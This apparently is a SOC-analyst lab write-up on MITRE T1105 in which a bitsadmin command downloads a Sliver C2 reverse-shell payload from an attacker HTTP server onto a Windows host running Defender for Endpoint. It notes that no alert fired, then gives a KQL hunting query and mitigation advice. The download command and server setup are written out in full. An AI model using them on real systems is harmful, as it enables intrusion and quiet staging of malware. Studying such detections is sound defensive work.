# Command and Control - Ingress Tool Transfer  
**MITRE ATT&CK Reference:** [T1105 – Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

This mini-investigation is a two-parter. First, we'll try to determine what Microsoft Defender for Endpoint (MDE) picksup during tool transfer. 
Then in part two, we'll move up the attack chain and establish persistence through a masqueraded service and analyze the detections.

Once initial access is achieved, dropping follow-up tooling is step one in solidifying control. 
This test simulates a common move: using the deprecated (but still operational) `bitsadmin.exe` to download a C2 payload from an attacker-controlled server.

`bitsadmin.exe` is signed, native, and capable of pulling files over HTTP. Perfect for flying under the radar.

---

## Scenario Overview

- **Attacker VM:** `HR-COMPLAINTS` (Ubuntu 22.04, Python HTTP server)  
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 w/ Microsoft Defender for Endpoint)  
  - **Admin User:** `TrustMeBro`

---

## Payload Transfer

The attacker hosts `updater.exe` (a malicious binary written with the C2 framework Sliver), using Python’s built-in web server:

```bash
sudo python3 -m http.server 80
```

From the Windows target, the attacker executes:

```cmd
bitsadmin /transfer downloader /priority foreground http://10.1.0.51/updater.exe C:\ProgramData\Microsoft\Windows\updater.exe
```

&nbsp;  
<img width="772" height="408" alt="download_payload_from_linux" src="https://github.com/user-attachments/assets/99caf106-68a9-4990-a3ee-d10b36375c81" />


---

## Detection

Despite using a commonly abused LOLBin to download a suspicious `.exe` file, **no alerts or incidents** were triggered by MDE. However, the event is recorded in the device timeline:

<img width="1699" height="167" alt="checking_device_timeline_for_bitsadmin_payload" src="https://github.com/user-attachments/assets/b0ef808a-6eff-45a1-9cbd-c9c748911240" />

We observe `bitsadmin.exe` initiating an outbound HTTP request to `10.1.0.51`.

---

## KQL – Bitsadmin Hunting

```kql
DeviceProcessEvents
| where FileName =~ "bitsadmin.exe"
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, ReportId
| order by Timestamp desc
```

<img width="1381" height="532" alt="checking_for_bitsadmin_payload_kql" src="https://github.com/user-attachments/assets/64890755-7ef0-4fd3-a311-db89081ab288" />

---  

**Mitigation & Detection Guidance** (based on [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)):

- **Network-level visibility**  
  Use intrusion detection/prevention systems (IDS/IPS) to flag suspicious outbound connections, especially to uncommon IPs or internal rogue hosts.

- **Command-line monitoring**  
  Track execution of native tools like `bitsadmin.exe` with unusual arguments or connections to non-corporate domains.

- **File system events**  
  Alert on file creation in obscure or high-risk paths like `C:\ProgramData\`.

- **Baseline awareness**  
  Investigate new binaries dropped by unfamiliar processes, especially those involving legacy transfer methods.

Now that the payload is successfully downloaded, we’ll pivot to execution by creating a service that quietly runs the staged updater.exe reverse shell.

➡️ **Next Step:** Continue the attack chain with the follow-up technique:  
[Windows Service Masquerade](https://github.com/j-manli/soc-analyst-notebook/persistence_windows_service_masquerade.md)
